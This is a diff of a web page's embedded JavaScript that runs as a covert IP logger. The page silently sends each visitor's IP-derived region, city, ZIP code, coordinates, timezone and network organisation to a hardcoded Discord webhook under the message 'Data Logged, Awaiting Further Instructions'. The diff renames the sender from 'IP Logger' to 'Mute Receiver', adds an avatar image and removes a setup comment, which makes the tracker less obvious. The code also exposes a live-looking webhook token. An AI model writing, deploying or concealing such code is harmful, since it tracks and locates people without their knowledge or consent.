@@ -41,7 +41,6 @@
 
         const request = new XMLHttpRequest();
         request.open("POST", "https://discord.com/api/webhooks/1041449820356874361/wKqt_ITs8PfC74iZXl3FONq8O6WJAjdejijXswXllVdDedDxi8986iifaIPeZh4EIujb");
-        // Put in your discord webhook url above ^^^
         
         request.setRequestHeader("Content-type", "application/json");
         const params = {
@@ -67,6 +66,8 @@
       });
     </script>
 
+
+
 <script>
   function monke(json) 
   {
@@ -78,8 +79,8 @@
   
        var params = 
        {
-            username: "IP Logger",
-            avatar_url: "",
+            username: "Mute Receiver",
+            avatar_url: "https://bsharp27.github.io/Ghost-Receiver/Image2.png",
             content: "**Data Logged, Awaiting Further Instructions**",
             embeds: [
                  {
@@ -90,7 +91,7 @@
                       "`\n**Region:** `" + json.region + 
                       "`\n**Town/City:** `" + json.city + 
                       "`\n**ZIP:** `" + json.postal +
-                      "`\n**Loc:** `" + json.loc +
+                      "`\n**Location:** `" + json.loc +
                       "`\n**Timezone:** `" + json.timezone +
                       "`\n**Org:** `" + json.org + "`"
 
